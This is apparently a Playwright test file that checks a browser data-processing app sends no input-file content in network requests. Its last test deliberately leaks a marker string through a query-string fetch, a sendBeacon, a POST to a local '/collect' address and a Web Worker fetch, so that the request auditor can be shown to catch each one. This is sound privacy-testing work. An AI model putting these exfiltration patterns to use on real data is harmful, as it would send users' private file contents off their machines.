import { mkdirSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { expect, test } from '@playwright/test';
import * as XLSX from 'xlsx';
import { auditRequests } from '../scripts/lib/request-audit';
import { readWorkbook } from '../scripts/lib/compare-workbooks';
import { allowedCodeUrls, runDataset, watchRequests, type DatasetConfig } from './helpers';

// CLAUDE.md: input file content never leaves the browser. A run may load the static assets of the app and nothing
// else, and no request may carry a piece of the files. The files below hold marker texts that no request may contain.
const ORIGIN = 'http://localhost:4176';
const MARKERS = ['PRIVATE-MARKER-Nguyen Thi Hoa 9f3a', 'Second PRIVATE-MARKER value ü & more'];

const flowFor = (sheet: boolean) => ({
  schemaVersion: 1,
  nodes: [
    { id: 'in', type: 'input_file', settings: sheet ? { key: 'Data', sheet: 'Data' } : { key: 'Data' } },
    { id: 'out', type: 'output', settings: { file: 'Result', sheet: 'Data' } },
  ],
  edges: [{ source: 'in', target: 'out' }],
});

function dataset(dir: string, file: string): DatasetConfig {
  return { name: 'privacy', dir, effectiveDate: '2026-09-30', inputs: { Data: file }, expectedFile: '' };
}

async function outputText(bytes: Uint8Array): Promise<string> {
  const wb = readWorkbook(bytes);
  return JSON.stringify(XLSX.utils.sheet_to_json(wb.Sheets.Data!, { header: 1 }));
}

test('a run of an xlsx file loads only static assets and sends no file content', async ({ page }, info) => {
  const dir = info.outputPath('xlsx');
  const wb = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet([['Id', 'Name'], ['1', MARKERS[0]], ['2', MARKERS[1]]]), 'Data');
  mkdirSync(dir, { recursive: true });
  writeFileSync(path.join(dir, 'data.xlsx'), XLSX.write(wb, { type: 'buffer', bookType: 'xlsx' }));

  const requests = watchRequests(page);
  const ran = await runDataset(page, flowFor(true), dataset(dir, 'data.xlsx'));
  // The markers did go through the engine: they are in the output file.
  const text = await outputText(ran.files[0]!.bytes);
  for (const m of MARKERS) expect(text).toContain(JSON.stringify(m).slice(1, -1));
  // The engine worker loads its wasm file while the run starts (from the app, or from jsDelivr in the Pages build). If
  // the log lacks it, the log does not see worker requests.
  expect(requests.some((r) => /\/duckdb-[^/]*\.wasm$/.test(r.url))).toBe(true);
  expect(auditRequests(requests, ORIGIN, MARKERS, allowedCodeUrls())).toEqual([]);
});

test('a run of a csv file, which DuckDB reads from the file handle, sends no file content either', async ({ page }, info) => {
  const dir = info.outputPath('csv');
  mkdirSync(dir, { recursive: true });
  writeFileSync(path.join(dir, 'data.csv'), `Id,Name\n1,"${MARKERS[0]}"\n2,"${MARKERS[1]}"\n`);

  const requests = watchRequests(page);
  const ran = await runDataset(page, flowFor(false), dataset(dir, 'data.csv'));
  const text = await outputText(ran.files[0]!.bytes);
  for (const m of MARKERS) expect(text).toContain(JSON.stringify(m).slice(1, -1));
  expect(auditRequests(requests, ORIGIN, MARKERS, allowedCodeUrls())).toEqual([]);
});

test('the audit fails when a page leaks: a query, a beacon and another address are all found', async ({ page }) => {
  const requests = watchRequests(page);
  await page.goto('/acceptance/index.html');
  await page.waitForFunction(() => typeof window.runDataset === 'function');
  const beforeLeaks = requests.length;
  expect(auditRequests(requests, ORIGIN, MARKERS, allowedCodeUrls())).toEqual([]); // loading the page alone is clean
  await page.evaluate(async (marker) => {
    await fetch(`/leak?d=${encodeURIComponent(marker)}`).catch(() => undefined);
    navigator.sendBeacon('/beacon', marker);
    await fetch('http://127.0.0.1:9/collect', { method: 'POST', body: marker, mode: 'no-cors' }).catch(() => undefined);
    // The same kind of leak from a Web Worker, where the engine runs. The address is absolute: a blob: base cannot resolve a path.
    const leakUrl = `${location.origin}/leak-from-worker?d=${encodeURIComponent(marker)}`;
    const code = 'self.onmessage = async (e) => { try { await fetch(e.data); } catch { /* the request is what counts */ } self.postMessage("done"); };';
    const worker = new Worker(URL.createObjectURL(new Blob([code], { type: 'text/javascript' })));
    await new Promise((resolve) => {
      worker.onmessage = resolve;
      worker.postMessage(leakUrl);
    });
    worker.terminate();
  }, MARKERS[0]!);
  await page.waitForTimeout(300);

  const violations = auditRequests(requests, ORIGIN, MARKERS, allowedCodeUrls());
  expect(violations.some((v) => /carries file content/.test(v))).toBe(true);
  expect(violations.some((v) => /not a static asset/.test(v))).toBe(true);
  expect(violations.some((v) => /another address/.test(v))).toBe(true);
  expect(violations.some((v) => /POST/.test(v))).toBe(true);
  // The listener sees the requests of a Web Worker too, and the audit finds the one that carries the marker.
  expect(requests.some((r) => r.url.includes('/leak-from-worker'))).toBe(true);
  expect(violations.some((v) => v.includes('/leak-from-worker') && /carries file content/.test(v))).toBe(true);
  // The findings come from the leaks: the requests before them were clean.
  expect(requests.length).toBeGreaterThan(beforeLeaks);
  expect(auditRequests(requests.slice(0, beforeLeaks), ORIGIN, MARKERS, allowedCodeUrls())).toEqual([]);
});
